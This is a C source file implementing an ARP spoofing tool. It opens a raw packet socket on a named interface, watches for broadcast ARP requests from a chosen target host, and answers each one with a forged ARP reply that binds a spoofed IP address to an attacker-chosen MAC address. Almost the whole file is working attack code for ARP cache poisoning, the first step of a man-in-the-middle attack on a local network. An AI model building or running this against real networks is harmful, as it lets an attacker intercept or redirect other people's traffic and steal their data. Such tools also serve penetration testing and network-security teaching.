#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netdb.h>
#include <linux/if_arp.h>

# include "define.h"
# include "struct.h"
# include "utils.h"

SOCKET initiate_socket_for_arp(char ifacename[IFNAMSIZ])
{
	SOCKET iface = 0;

	iface = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (iface == -1)
		goto err;
	if (setsockopt(iface, SOL_SOCKET, SO_BINDTODEVICE, ifacename, strlen(ifacename)) == -1)
		goto err;

	return iface;
err:
	if (iface > 0)
		close(iface);
	return(-1);	
}

int arpspoof(SOCKET iface, const attack *attacks_infos)
{
	unsigned char buf[4096] = { 0x0 };
	unsigned char payload[4096] = { 0x0 };
	eth *eth_hdr;
	arp *arp_hdr;
	struct sockaddr_ll ifaceinfo;
	socklen_t ifaceinfolen = sizeof(struct sockaddr_ll);

	while (1)
	{
		int rlen = recvfrom(iface, buf, sizeof(buf), 0, (struct sockaddr*)&ifaceinfo, &ifaceinfolen);
		eth_hdr = (eth*)buf;
		arp_hdr = (arp*)(buf + ETH_HLEN);

		/* check wether it's the arp request we are willing to spoof */
		if (arp_hdr->operation == htons(0x1) /* is it a request */
			&& is_hbroadcast_addr(eth_hdr->dest_addr)	/* is it on broadcast */
			&& is_mac_equal(eth_hdr->src_addr, attacks_infos->target_ha) /* is the sender the one who owns the mac address we are targetting */
			&& is_ipv4_equal(arp_hdr->sender_pa, attacks_infos->target_pa)) /* is the sender the one who owns the ipv4 address we are targetting */
		{
			eth *eth_phdr = (eth*)payload;
			arp *arp_phdr = (arp*)(payload + ETH_HLEN);
			struct sockaddr_ll ifaceinfocpy = { 0x0 };

			copy_mac(eth_phdr->dest_addr, eth_hdr->src_addr);	/* 6 bytes dest addr */
			copy_mac(eth_phdr->src_addr, attacks_infos->self_ha);	/* 6 bytes src addr (us) */
			eth_phdr->eth_type = htons(ETH_P_ARP);	/* arp request htons(0x0806) */
			arp_phdr->htype = arp_hdr->htype;	/* hardware type htons(0x1) */
			arp_phdr->ptype = arp_hdr->ptype;	/* protocol type htons(0x0800) */
			arp_phdr->hlen = arp_hdr->hlen;	/* hardware addr len 6 */
			arp_phdr->plen = arp_hdr->plen; /* proto addr len 4 */
			arp_phdr->operation = htons(0x2);	/* response arp type */
			copy_mac(arp_phdr->sender_ha, attacks_infos->spoofed_ha);	/* source mac addr */
			copy_ipv4(arp_phdr->sender_pa, attacks_infos->spoofed_pa);	/* source ip addr */
			copy_mac(arp_phdr->target_ha, attacks_infos->target_ha);	/* mac origin of the response (us) */
			copy_ipv4(arp_phdr->target_pa, attacks_infos->target_pa);	/* ip origin of the response (us) */

			ifaceinfocpy.sll_family = AF_PACKET;
			ifaceinfocpy.sll_protocol = htons(ETH_P_ARP);
			ifaceinfocpy.sll_ifindex = ifaceinfo.sll_ifindex;
			ifaceinfocpy.sll_hatype = htons(ARPHRD_ETHER);
			ifaceinfocpy.sll_pkttype = (0);
			ifaceinfocpy.sll_halen = ETH_ALEN;
			ifaceinfocpy.sll_addr[6] = 0x00;
			ifaceinfocpy.sll_addr[7] = 0x00;
			rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfocpy, sizeof(ifaceinfocpy));

			printf("%d | %s\n", rlen, strerror(errno));

			ifaceinfolen = sizeof(ifaceinfocpy);
			memset(&ifaceinfocpy, 0x0, sizeof(ifaceinfocpy));
			memset(payload, 0x0, 4096);
		}

		memset(buf, 0x0, 4096);
		// return 0;
	}
}